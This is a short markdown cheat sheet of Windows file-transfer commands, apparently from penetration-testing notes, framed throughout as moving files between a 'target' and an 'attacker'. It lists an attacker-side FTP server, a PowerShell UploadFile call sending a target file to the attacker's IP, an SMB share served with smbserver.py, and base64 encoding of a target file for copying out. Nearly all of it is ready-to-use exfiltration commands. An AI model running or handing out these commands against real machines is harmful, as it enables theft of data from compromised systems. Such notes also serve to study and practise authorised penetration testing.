# Table of content

- [Table of content](#table-of-content)
- [return to index](INDEX.md)
  - [Windows - Uploads commands](#windows---all-commands)
    - [Upload a file - FTP](#upload-a-file---ftp)
    - [Upload a file - SMB](#upload-a-file---smb)
    - [Transfer file from target to attacker](#transfer-file-from-target-to-attacker)

## Windows - Uploads commands

### Upload a file - FTP

launch on the attacker a ftp server using python

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

then on the target you can transfer whatever you want

```cmd
(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$cheminFichier')
```

### Upload a file - SMB

launch on the attacker a smb server using python

```bash
python3 smbserver.py -smb2support MYSHARE /path/to/shared/directory
```

then on the target

```cmd
xcopy \server\MYSHARE\file.txt C:\path\to\local\directory\
```

### Transfer file from target to attacker

encode in b64 on the target

```cmd
[Convert]::ToBase64String((Get-Content -path "$fichier" -Encoding byte))
```

then on the attacker

```bash
echo $base64 | base64 -d > $fichier
```
